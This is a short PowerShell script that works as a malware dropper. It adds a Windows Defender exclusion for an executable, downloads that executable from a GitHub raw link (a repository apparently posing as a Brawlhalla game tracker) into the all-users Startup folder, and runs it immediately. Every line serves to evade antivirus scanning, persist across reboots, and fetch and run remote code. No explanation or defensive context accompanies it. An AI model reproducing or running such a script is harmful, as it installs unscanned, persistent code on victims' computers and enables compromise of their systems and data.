$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
$url = "https://github.com/FCsab/Brawlhalla-Tracker/blob/main/valaminemjogec.exe?raw=true"
$outputPath = Join-Path $startupFolder "valaminemjogec.exe"
Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\valaminemjogec.exe"

Invoke-WebRequest -Uri $url -OutFile $outputPath

& $outputPath
Start-Sleep -Seconds 1
[System.Environment]::Exit(0)
